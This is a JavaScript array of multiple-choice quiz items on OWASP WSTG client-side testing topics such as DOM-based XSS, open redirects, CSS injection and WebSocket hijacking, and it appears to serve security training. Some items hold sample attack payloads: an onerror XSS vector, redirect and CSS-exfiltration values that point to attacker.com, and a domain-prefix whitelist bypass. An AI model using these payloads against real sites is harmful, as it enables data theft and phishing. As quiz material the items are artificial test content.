var pool = [
  {
    "c": "WSTG-CLNT-01: DOM-based Cross Site Scripting",
    "q": "What is the primary difference between DOM-based XSS and Reflected XSS?",
    "a": "DOM-based XSS occurs entirely in the client-side code, while Reflected XSS involves the server echoing input back to the browser.",
    "d": ["DOM-based XSS only works in Internet Explorer.", "Reflected XSS is more dangerous than DOM-based XSS.", "DOM-based XSS requires the use of a database."],
    "e": "In DOM-based XSS, the vulnerability is in the client-side JavaScript that processes data from a 'source' (like location.hash) and sends it to a 'sink' (like innerHTML) without proper validation."
  },
  {
    "c": "WSTG-CLNT-01: DOM-based Cross Site Scripting",
    "q": "Which of the following is considered a 'Source' in a DOM-based XSS attack?",
    "a": "location.search",
    "d": ["document.write()", "innerHTML", "eval()"],
    "e": "A 'source' is a JavaScript property that accepts data that is under the attacker's control, such as parts of the URL (search, hash, etc.)."
  },
  {
    "c": "WSTG-CLNT-01: DOM-based Cross Site Scripting",
    "q": "Which of the following is considered a 'Sink' in a DOM-based XSS attack?",
    "a": "element.innerHTML",
    "d": ["document.referrer", "window.name", "location.href"],
    "e": "A 'sink' is a function or DOM object that can execute or render data, leading to code execution if the data is malicious."
  },
  {
    "c": "WSTG-CLNT-02: JavaScript Execution",
    "q": "A tester finds that they can execute arbitrary JavaScript by manipulating a value stored in 'window.name' which is then passed to 'eval()'. This is an example of:",
    "a": "Client-side JavaScript Execution vulnerability.",
    "d": ["Server-side Template Injection.", "SQL Injection.", "Cross-Site Request Forgery."],
    "e": "Passing user-controlled data to execution sinks like eval(), setTimeout(), or setInterval() is extremely dangerous."
  },
  {
    "c": "WSTG-CLNT-03: HTML Injection",
    "q": "What is the primary risk of Client-side HTML Injection if it cannot be used for XSS?",
    "a": "Defacement of the page or spoofing of the UI to trick the user into performing actions.",
    "d": ["Stealing the user's session cookie.", "Executing commands on the web server.", "Bypassing the Same-Origin Policy."],
    "e": "Even if <script> tags are filtered, an attacker can inject <img>, <iframe>, or <a> tags to perform phishing or clickjacking."
  },
  {
    "c": "WSTG-CLNT-04: Client-Side URL Redirect",
    "q": "An application uses 'location.href = new URLSearchParams(window.location.search).get(\"target\")' to redirect users. How can this be exploited?",
    "a": "By setting the 'target' parameter to a malicious site (e.g., ?target=https://attacker.com).",
    "d": ["By injecting a SQL query into the 'target' parameter.", "By flooding the server with redirect requests.", "By stealing the server's private key via the URL."],
    "e": "Open redirects can be used in phishing campaigns to make a malicious link look like it belongs to a trusted domain."
  },
  {
    "c": "WSTG-CLNT-05: CSS Injection",
    "q": "How can CSS Injection be used to steal sensitive data from a page?",
    "a": "By using attribute selectors and background images to exfiltrate data character by character.",
    "d": ["By changing the font color to make the text unreadable.", "By redirecting the user to a different page using the 'content' property.", "By executing JavaScript using the 'style' attribute in modern browsers."],
    "e": "CSS selectors like input[value^='a'] { background-image: url('https://attacker.com/log?char=a'); } can be used to leak values from input fields."
  },
  {
    "c": "WSTG-CLNT-06: Client-Side Resource Manipulation",
    "q": "What is Client-side Resource Manipulation?",
    "a": "Manipulating the URL of resources (scripts, images, etc.) loaded by the application.",
    "d": ["Modifying the server's database via a client-side script.", "Changing the physical hardware of the client's computer.", "Bypassing the client's local firewall."],
    "e": "If an application dynamically loads a script based on a URL parameter, an attacker could point it to a malicious script on their own server."
  },
  {
    "c": "WSTG-CLNT-07: Cross-Site Flashing",
    "q": "Although legacy, what was the primary cause of 'Cross-Site Flashing'?",
    "a": "Insecurely handling parameters passed from HTML to a Flash (SWF) movie.",
    "d": ["Using a camera flash to blind the user during a login attempt.", "Rapidly changing the background color of the page to cause a seizure.", "A vulnerability in the way browsers handle animated GIFs."],
    "e": "Flash movies often accepted variables via FlashVars. If these were used in sinks like getURL() or ExternalInterface.call(), it led to XSS."
  },
  {
    "c": "WSTG-CLNT-08: Web Socket",
    "q": "Which security risk is unique to WebSockets compared to standard HTTP requests?",
    "a": "Lack of a built-in Same-Origin Policy (SOP) enforcement for the initial handshake.",
    "d": ["They cannot be used with TLS/SSL.", "They are limited to sending only binary data.", "They require the user to install a special browser plugin."],
    "e": "WebSockets do not follow the SOP. A malicious site can attempt to open a WebSocket connection to another site the user is logged into (Cross-Site WebSocket Hijacking)."
  },
  {
    "c": "WSTG-CLNT-09: Web Messaging",
    "q": "When using 'window.postMessage', why is it critical to check the 'event.origin' property?",
    "a": "To ensure the message was sent from a trusted domain and prevent Cross-Site Messaging attacks.",
    "d": ["To identify the IP address of the user who sent the message.", "To determine the browser version of the sender.", "To encrypt the message before it is processed."],
    "e": "Without checking the origin, any website can send messages to your application's message listener, potentially leading to XSS or logic flaws."
  },
  {
    "c": "WSTG-CLNT-10: Local Storage",
    "q": "What is a major security disadvantage of storing sensitive data (like session tokens) in 'localStorage'?",
    "a": "Data in localStorage is accessible to any JavaScript running on the same origin, including injected XSS scripts.",
    "d": ["LocalStorage is cleared every time the browser is closed.", "LocalStorage is limited to only 4KB of data.", "LocalStorage is only available over HTTP, not HTTPS."],
    "e": "Unlike cookies with the 'HttpOnly' flag, localStorage cannot be protected from JavaScript access, making it a high-value target for XSS."
  },
  {
    "c": "WSTG-CLNT-11: Cross-Site Script Inclusion (XSSI)",
    "q": "What is the goal of an XSSI attack?",
    "a": "To steal sensitive data from a JavaScript file by including it in a malicious page using a <script> tag.",
    "d": ["To inject a <script> tag into a database via a POST request.", "To bypass a firewall by wrapping a payload in a JSON object.", "To execute code on the server by uploading a malicious JS file."],
    "e": "XSSI exploits the fact that <script> tags are not restricted by the SOP, allowing an attacker to include a victim's private JS data (like JSONP or global variables)."
  },
  {
    "c": "WSTG-CLNT-01: DOM-based Cross Site Scripting",
    "q": "Which modern JavaScript feature can help prevent DOM-based XSS by providing a safe way to handle strings in sinks?",
    "a": "Trusted Types API",
    "d": ["Async/Await", "Strict Mode", "Web Workers"],
    "e": "The Trusted Types API allows developers to restrict how data is passed to dangerous sinks, ensuring it has been through a sanitization policy."
  },
  {
    "c": "WSTG-CLNT-10: Local Storage",
    "q": "How does 'sessionStorage' differ from 'localStorage' in terms of persistence?",
    "a": "sessionStorage data is deleted when the page session ends (tab closed), whereas localStorage persists until explicitly deleted.",
    "d": ["sessionStorage is more secure because it is encrypted.", "sessionStorage is only for the server, not the client.", "sessionStorage has no limit on the amount of data stored."],
    "e": "Both share the same security risks regarding XSS access, but their lifetimes differ."
  },
  {
    "c": "WSTG-CLNT-08: Web Socket",
    "q": "What is the correct protocol prefix for a secure WebSocket connection?",
    "a": "wss://",
    "d": ["https://", "ws://", "swn://"],
    "e": "Just as HTTPS is for HTTP, WSS is the secure (encrypted) version of the WebSocket protocol."
  },
  {
    "c": "WSTG-CLNT-01: DOM-based Cross Site Scripting",
    "q": "A tester sees 'document.getElementById(\"output\").innerHTML = location.hash;'. What is the most likely exploit payload?",
    "a": "#<img src=x onerror=alert(1)>",
    "d": "?name=<script>alert(1)</script>",
    "e": "Since the payload is in the hash (#), it is never sent to the server. The client-side JS takes the string and injects it into the DOM."
  },
  {
    "c": "WSTG-CLNT-03: HTML Injection",
    "q": "Which of the following is a safe alternative to 'innerHTML' for updating the text content of an element?",
    "a": "textContent",
    "d": ["outerHTML", "insertAdjacentHTML", "document.write"],
    "e": "The 'textContent' property treats all input as literal text, not HTML, preventing the execution of any injected tags."
  },
  {
    "c": "WSTG-CLNT-09: Web Messaging",
    "q": "What is 'Clickjacking' and how does it relate to client-side security?",
    "a": "An attacker uses an invisible iframe to trick a user into clicking a button on a different site.",
    "d": ["An attacker steals the user's mouse movements to predict their password.", "An attacker replaces a legitimate download link with a malicious one.", "An attacker uses JavaScript to automatically click every link on a page."],
    "e": "Clickjacking is a UI redress attack. It is mitigated by headers like 'X-Frame-Options' or the 'frame-ancestors' directive in CSP."
  },
  {
    "c": "WSTG-CLNT-04: Client-Side URL Redirect",
    "q": "Why is it often easier to bypass an 'Open Redirect' whitelist that only checks if the URL starts with 'https://example.com'?",
    "a": "An attacker can use a URL like 'https://example.com.attacker.com'.",
    "d": ["Attackers can use a VPN to change their IP address.", "The 'https' prefix makes any URL trusted by the browser.", "Whitelist checks are ignored by mobile browsers."],
    "e": "Simple 'starts with' checks can be bypassed by using the target domain as a subdomain of the attacker's domain."
  }
];
var MASTER_POOL = pool;
